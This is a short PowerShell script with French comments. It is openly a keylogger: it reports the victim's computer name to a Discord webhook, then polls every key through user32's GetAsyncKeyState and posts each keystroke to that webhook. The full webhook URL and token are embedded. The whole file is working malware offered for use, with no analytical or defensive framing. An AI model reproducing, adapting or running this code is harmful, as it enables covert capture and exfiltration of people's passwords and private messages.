$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

# Message de démarrage
iwr $webhook -Method Post -Body (@{content="Keylogger invisible + zéro perte lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

$code = @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
}
'@

Add-Type $code

while($true){
    Start-Sleep -m 20
    for($i=8;$i -le 254;$i++){
        if([K]::GetAsyncKeyState($i) -eq -32767){
            $char = [char]$i
            iwr $webhook -Method Post -Body (@{content=$char}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
    }
}
